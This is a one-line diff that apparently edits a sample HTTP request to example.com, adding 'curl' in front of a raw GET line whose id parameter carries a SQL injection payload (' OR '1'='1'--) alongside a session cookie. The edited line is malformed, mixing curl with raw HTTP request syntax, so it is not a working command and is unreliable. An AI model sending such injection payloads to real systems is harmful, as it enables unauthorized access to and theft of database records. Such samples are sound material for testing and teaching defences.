@@ -1,1 +1,1 @@
-GET /ticket?id=' OR '1'='1'-- HTTP/1.1 Host: example.com Cookie: session=valid_session_data 
+curl GET /ticket?id=' OR '1'='1'-- HTTP/1.1 Host: example.com Cookie: session=valid_session_data 
